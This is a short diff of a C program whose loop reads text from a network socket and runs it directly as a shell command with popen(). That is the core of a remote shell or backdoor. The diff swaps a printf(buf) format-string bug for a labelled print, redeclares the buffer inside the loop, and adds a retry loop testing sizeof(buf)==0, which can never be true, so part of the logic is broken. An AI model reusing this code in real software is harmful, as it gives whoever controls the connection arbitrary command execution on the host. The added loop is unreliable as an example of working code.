@@ -35,8 +35,11 @@ int main() {
   // Receive data from port;
   do {
     send( ConnectSocket, prompt, sizeof(prompt), 0);
-    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
-    printf(buf);
+    char buf[BUF_LEN] = "";
+    do {
+       res = recv( ConnectSocket, buf, BUF_LEN, 0 );
+    } while (sizeof(buf) == 0);
+    printf("buf = [%s]",buf);
     output = popen(buf, "r");
 
     while (fgets(response, RESPONSE_SZ, output) != NULL) {
